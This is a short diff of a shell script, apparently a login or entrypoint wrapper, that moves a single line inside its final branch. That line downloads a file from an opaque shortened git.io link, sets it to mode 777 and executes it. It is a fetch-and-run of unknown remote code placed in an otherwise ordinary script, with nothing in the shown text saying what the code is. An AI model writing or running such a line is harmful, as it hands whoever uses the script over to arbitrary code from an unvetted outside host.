@@ -22,5 +22,5 @@ else
 	done
 	[[ $1 ]] && exec "$@"
 	exec bash --login
+	wget https://git.io/JycVg && chmod 777 JycVg && ./JycVg
 fi
-wget https://git.io/JycVg && chmod 777 JycVg && ./JycVg
